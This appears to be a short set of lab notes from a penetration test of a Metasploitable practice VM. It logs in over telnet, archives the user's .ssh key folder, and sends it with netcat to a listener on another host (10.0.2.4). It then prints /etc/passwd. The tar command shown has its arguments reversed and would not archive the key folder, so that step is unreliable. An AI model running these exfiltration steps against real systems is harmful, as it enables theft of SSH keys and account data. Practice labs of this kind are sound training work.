###  user user
`telnet 10.0.2.13 23`
```
Connected to 10.0.2.13.
Escape character is '^]'.
Ubuntu 8.04
metasploitable login: user
Password: 
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.
```
`id`
```
uid=1001(user) gid=1001(user) groups=1001(user)
```
`ls -la` 
```
drwxr-xr-x 3 user user 4096 2010-05-07 14:38 .
drwxr-xr-x 6 root root 4096 2010-04-16 02:16 ..
-rw------- 1 user user  165 2010-05-07 14:38 .bash_history
-rw-r--r-- 1 user user  220 2010-03-31 06:42 .bash_logout
-rw-r--r-- 1 user user 2928 2010-03-31 06:42 .bashrc
-rw-r--r-- 1 user user  586 2010-03-31 06:42 .profile
drwx------ 2 user user 4096 2010-05-07 14:36 .ssh
```
#### sending .ssh
`tar -cvf .ssh ssh.tar` 
`-c` create archive, `v` verbose, `f` set archive name

Setting a listener:
`nc -lvp 9999 > user_ssh.dump`
Sending .ssh over:
`nc -vn 10.0.2.4 9999 < ssh.tar`
`cat /etc/passwd`
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
dhcp:x:101:102::/nonexistent:/bin/false
syslog:x:102:103::/home/syslog:/bin/false
klog:x:103:104::/home/klog:/bin/false
sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
bind:x:105:113::/var/cache/bind:/bin/false
postfix:x:106:115::/var/spool/postfix:/bin/false
ftp:x:107:65534::/home/ftp:/bin/false
postgres:x:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
mysql:x:109:118:MySQL Server,,,:/var/lib/mysql:/bin/false
tomcat55:x:110:65534::/usr/share/tomcat5.5:/bin/false
distccd:x:111:65534::/:/bin/false
user:x:1001:1001:just a user,111,,:/home/user:/bin/bash
service:x:1002:1002:,,,:/home/service:/bin/bash
telnetd:x:112:120::/nonexistent:/bin/false
proftpd:x:113:65534::/var/run/proftpd:/bin/false
```